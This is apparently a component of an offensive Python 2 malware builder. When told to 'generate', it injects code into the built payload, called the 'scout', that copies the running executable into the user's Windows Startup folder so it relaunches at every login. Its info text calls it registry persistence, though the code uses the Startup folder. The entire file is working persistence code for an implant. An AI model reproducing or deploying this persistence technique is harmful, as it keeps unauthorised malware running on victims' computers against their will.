# verified
import library.modules.config as config

config.main()


def main(option):
    if option == 'generate':
        config.import_statements.append('from shutil import copy')
        config.import_statements.append('from os import path, getcwd')
        config.import_statements.append('from sys import argv')
        config.import_statements.append('from getpass import getuser')
        config.startup.append('startup_persist_startup(path.join(getcwd(),path.abspath(argv[0])))')
        config.functions.append('''
def startup_persist_startup(filepath):
        copy(filepath, 'C:\\\\Users\\\\' + getuser() + '\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\' + path.basename(argv[0]))
''')
    elif option == 'info':
        print '\nName             : Registry Persistence startup component' \
              '\nOS               : Windows' \
              '\nRequired Modules : shutil, sys, os' \
              '\nCommands         : NIL (Runs at startup)' \
              '\nDescription      : This module copies the scout to the windows startup folder'
